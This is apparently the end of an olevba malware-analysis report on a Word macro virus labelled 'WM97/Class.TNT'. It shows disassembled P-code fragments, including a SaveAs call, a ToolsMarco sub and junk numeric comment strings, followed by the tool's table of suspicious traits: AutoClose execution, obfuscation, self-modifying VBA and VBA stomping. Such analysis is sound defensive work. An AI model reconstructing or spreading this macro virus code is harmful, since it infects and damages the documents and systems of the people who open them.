' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #95:
' 	QuoteRem 0x0000 0x0058 "874503184005337763600004,6678912636393E+228745031840053377636000087450318400533776360000"
' Line #96:
' 	EndSub 
' Line #97:
' 	QuoteRem 0x0000 0x0056 "46225041212931356164001,35502059482088E+2146225041212931356164004622504121293135616400"
' Line #98:
' 	FuncDefn (Sub ToolsMarco())
' Line #99:
' 	QuoteRem 0x0000 0x0059 "264813783612301974845216,09594668535104E+212648137836123019748452126481378361230197484521"
' Line #100:
' 	EndSub 
' 	QuoteRem 0x0008 0x0020 "WM97/Class.TNT by Virus :) Smile"
' Line #101:
' 	QuoteRem 0x0000 0x0053 "9814270489241926916002,37433619219358E+20981427048924192691600981427048924192691600"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Hex String|4%64Ta2             |34253634546132                               |
|Hex String|e r$I0~             |6520722449307E                               |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

